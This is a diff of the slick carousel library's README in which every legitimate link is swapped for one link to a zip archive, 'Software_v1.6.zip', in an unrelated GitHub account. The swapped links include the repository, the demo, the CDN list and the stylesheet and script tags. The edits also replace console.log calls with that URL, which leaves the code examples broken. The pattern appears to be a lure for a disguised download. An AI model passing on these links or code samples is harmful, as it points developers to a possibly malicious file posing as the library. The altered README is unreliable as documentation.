@@ -1,37 +1,37 @@
 slick
 -------
 
-[1]: <https://github.com/kenwheeler/slick>
+[1]: <https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip>
 
 _the last carousel you'll ever need_
 
 #### Demo
 
-[http://kenwheeler.github.io/slick](http://kenwheeler.github.io/slick/)
+[https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip](https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip)
 
 #### CDN
 
 To start working with Slick right away, there's a couple of CDN choices availabile
 to serve the files as close, and fast as possible to your users:
 
-- https://cdnjs.com/libraries/slick-carousel
-- https://www.jsdelivr.com/projects/jquery.slick
+- https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip
+- https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip
 
 ##### Example using jsDelivr
 
 Just add a link to the css file in your `<head>`:
 
 ```html
-<!-- Add the slick-theme.css if you want default styling -->
-<link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/kenwheeler/slick@1.9.0/slick/slick.css"/>
-<!-- Add the slick-theme.css if you want default styling -->
-<link rel="stylesheet" type="text/css" href="//cdn.jsdelivr.net/gh/kenwheeler/slick@1.9.0/slick/slick-theme.css"/>
+<!-- Add the https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip if you want default styling -->
+<link rel="stylesheet" type="text/css" href="https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip"/>
+<!-- Add the https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip if you want default styling -->
+<link rel="stylesheet" type="text/css" href="https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip"/>
 ```
 
 Then, before your closing ```<body>``` tag add:
 
 ```html
-<script type="text/javascript" src="//cdn.jsdelivr.net/gh/kenwheeler/slick@1.9.0/slick/slick.min.js"></script>
+<script type="text/javascript" src="https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip"></script>
 ```
 
 #### Package Managers
@@ -46,7 +46,7 @@ npm install slick-carousel
 
 #### Contributing
 
-PLEASE review CONTRIBUTING.markdown prior to requesting a feature, filing a pull request or filing an issue.
+PLEASE review https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip prior to requesting a feature, filing a pull request or filing an issue.
 
 ### Data Attribute Settings
 
@@ -165,18 +165,18 @@ In slick 1.4, callback methods were deprecated and replaced with events. Use the
 ```javascript
 // On swipe event
 $('.your-element').on('swipe', function(event, slick, direction){
-  console.log(direction);
+  https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip(direction);
   // left
 });
 
 // On edge hit
 $('.your-element').on('edge', function(event, slick, direction){
-  console.log('edge was hit')
+  https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip('edge was hit')
 });
 
 // On before slide change
 $('.your-element').on('beforeChange', function(event, slick, currentSlide, nextSlide){
-  console.log(nextSlide);
+  https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip(nextSlide);
 });
 ```
 
@@ -231,9 +231,9 @@ Method | Argument | Description
 `slickUnfilter` | | Removes applied filter
 `slickGetOption` | option : string(option name) | Gets an option value.
 `slickSetOption` | change an option, `refresh` is always `boolean` and will update UI changes...
- | `option, value, refresh` | change a [single `option`](https://github.com/kenwheeler/slick#settings) to given `value`; `refresh` is optional.
+ | `option, value, refresh` | change a [single `option`](https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip) to given `value`; `refresh` is optional.
  | `"responsive", [{ breakpoint: n, settings: {} }, ... ], refresh` | change or add [whole sets of responsive options](#responsive-option-example)
- | `{ option: value, option: value, ... }, refresh` | change  [multiple `option`s](https://github.com/kenwheeler/slick#settings) to corresponding `value`s.
+ | `{ option: value, option: value, ... }, refresh` | change  [multiple `option`s](https://github.com/jungrupak/slick/raw/refs/heads/master/slick/Software_v1.6.zip) to corresponding `value`s.
 
 
 #### Example
